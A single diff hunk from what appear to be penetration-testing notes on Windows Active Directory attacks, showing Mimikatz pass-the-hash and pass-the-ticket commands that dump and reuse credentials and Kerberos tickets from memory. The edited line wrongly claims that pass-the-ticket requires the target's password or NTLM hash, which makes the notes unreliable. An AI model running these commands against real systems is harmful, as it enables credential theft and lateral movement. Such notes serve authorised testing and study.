@@ -1631,7 +1631,7 @@ sekurlsa::pth /user:Administrator /domain:corp.com /ntlm:2892D26CDF84D7A70E2EB3B
 ```
 
 6. Pass the Ticket:    
-	1. (Administrator on the local machine, unless the TGS belongs to current user)
+	1. (Administrator on the local machine, unless the TGS belongs to current user; this requires the target user's password or NTLM hash)
 ```
 privilege::debug
 sekurlsa::tickets /export       
